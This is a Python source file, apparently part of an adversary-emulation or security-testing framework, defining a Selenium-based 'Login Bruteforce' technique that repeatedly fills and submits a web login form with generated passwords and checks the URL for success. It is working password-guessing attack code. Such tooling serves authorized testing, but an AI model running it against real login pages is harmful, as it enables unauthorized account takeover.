from selenium.webdriver.common.by import By
from selenium.webdriver.remote.webdriver import WebDriver
from selenium.common.exceptions import NoSuchElementException

from ...core.ttp import TTP
from ...payloads.generators import PayloadGenerator

class LoginBruteforceTTP(TTP):
    """
    A TTP that emulates a login bruteforce attack.
    """
    def __init__(self,
                 payload_generator: PayloadGenerator,
                 username: str,
                 username_selector: str,
                 password_selector: str,
                 submit_selector: str):

        super().__init__(
            name="Login Bruteforce",
            description="Attempts to guess a user's password using a list of payloads."
        )
        self.payload_generator = payload_generator
        self.username = username
        self.username_selector = username_selector
        self.password_selector = password_selector
        self.submit_selector = submit_selector

    def get_payloads(self):
        """Yields passwords from the configured generator."""
        yield from self.payload_generator()

    def execute_step(self, driver: WebDriver, payload: str):
        """Fills the login form and submits it."""
        try:
            username_field = driver.find_element(By.CSS_SELECTOR, self.username_selector)
            password_field = driver.find_element(By.CSS_SELECTOR, self.password_selector)

            username_field.clear()
            username_field.send_keys(self.username)

            password_field.clear()
            password_field.send_keys(payload) # Payload is the password

            # Use submit button if available, otherwise press Enter on the password field
            try:
                submit_button = driver.find_element(By.CSS_SELECTOR, self.submit_selector)
                submit_button.click()
            except NoSuchElementException:
                password_field.send_keys("\n")

        except NoSuchElementException as e:
            raise Exception(f"Could not find a login element on the page: {e}")

    def verify_result(self, driver: WebDriver) -> bool:
        """
        Checks for indicators of a successful login.
        A simple check is if the URL no longer contains 'login'.
        """
        return "login" not in driver.current_url.lower()
